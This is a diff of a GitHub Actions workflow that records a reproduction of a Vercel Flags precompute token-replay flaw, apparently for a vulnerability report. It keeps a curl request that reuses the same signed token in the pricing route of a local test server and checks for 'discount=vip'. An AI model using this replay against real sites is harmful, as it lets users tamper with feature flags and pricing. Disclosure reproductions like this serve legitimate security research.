@@ -1,4 +1,4 @@
-name: Vercel Flags real desktop proof
+name: Vercel Flags replay reproduction
 
 on:
   push:
@@ -7,7 +7,7 @@ on:
   workflow_dispatch:
 
 jobs:
-  real-desktop-proof:
+  reproduction:
     runs-on: ubuntu-22.04
     env:
       FLAGS_SECRET: Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M
@@ -20,7 +20,7 @@ jobs:
         with:
           node-version: '22'
 
-      - name: Install app, Chromium, and real desktop capture tools
+      - name: Install app, Chromium, and desktop capture tools
         run: |
           sudo apt-get update
           sudo apt-get install -y xvfb xterm fluxbox ffmpeg xdotool
@@ -50,7 +50,7 @@ jobs:
           test "$ready" -eq 1
           echo "production_server_ready=true"
 
-      - name: Record real terminal and headed Chromium
+      - name: Record terminal and Chromium reproduction
         run: |
           cd security/vercel-flags-precompute-replay/e2e
           rm -rf evidence-real
@@ -64,8 +64,8 @@ jobs:
           ORIGIN="http://127.0.0.1:3000"
 
           clear
-          printf 'VERCEL FLAGS HACKERONE PROOF — REAL COMMAND EXECUTION\n'
-          printf '==================================================\n\n'
+          printf 'VERCEL FLAGS PRECOMPUTE REPLAY\n'
+          printf '================================\n\n'
           printf '$ node --version\n'
           node --version
           printf '$ npm ls flags next --depth=0\n'
@@ -96,7 +96,7 @@ jobs:
           while [ ! -e /tmp/h1-browser-2 ]; do sleep 0.1; done
 
           REPLAY_URL="$ORIGIN/$TOKEN/pricing/$TOKEN"
-          printf '\nREPLAY: exact same signed token is used in both URL positions\n'
+          printf '\nReplay the same signed token in the pricing position\n'
           printf 'source_token_sha256=%s\n' "$TOKEN_SHA"
           printf 'token_modified=false\n'
           printf '$ curl -fsS "%s"\n' "$REPLAY_URL"
@@ -105,13 +105,12 @@ jobs:
           printf 'replay_result=%s\n' "$REPLAY_RENDERED"
           printf '%s' "$REPLAY_RENDERED" | grep -q 'discount=vip'
           printf 'same_token_used_for_root_and_pricing=true\n'
-          printf 'cross_group_replay=PASS\n'
+          printf 'result=discount_changed_after_replay\n'
           printf '%s' "$REPLAY_URL" > /tmp/h1-replay-url
           touch /tmp/h1-phase-3
           while [ ! -e /tmp/h1-browser-3 ]; do sleep 0.1; done
 
-          printf '\nPROOF COMPLETE — browser at right shows the same live responses.\n'
-          printf 'No generated or composited evidence was used.\n'
+          printf '\nReproduction complete.\n'
           sleep 5
           touch /tmp/h1-proof-done
           BASH
@@ -176,7 +175,7 @@ jobs:
           ffmpeg -y -loglevel warning \
             -f x11grab -framerate 30 -video_size 1600x900 -i :99.0 \
             -c:v libx264 -preset veryfast -crf 20 -pix_fmt yuv420p \
-            evidence-real/vercel-flags-real-terminal-browser-proof.mp4 \
+            evidence-real/vercel-flags-replay-reproduction.mp4 \
             > /tmp/ffmpeg.log 2>&1 &
           FFMPEG_PID=$!
 
@@ -184,7 +183,7 @@ jobs:
             -geometry 92x47+0+0 \
             -fa Monospace -fs 11 \
             -bg black -fg white \
-            -title "REAL TERMINAL — Vercel Flags PoC" \
+            -title "Vercel Flags reproduction" \
             -hold -e bash ./proof-terminal.sh &
           XTERM_PID=$!
 
@@ -211,11 +210,11 @@ jobs:
           printf 'generated_evidence=none\n' >> evidence-real/manifest.txt
           printf 'cross_group_replay=PASS\n' >> evidence-real/manifest.txt
 
-      - name: Upload real desktop evidence
+      - name: Upload reproduction
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: vercel-flags-real-terminal-browser-proof
+          name: vercel-flags-replay-reproduction
           path: |
             security/vercel-flags-precompute-replay/e2e/evidence-real/**
           if-no-files-found: error
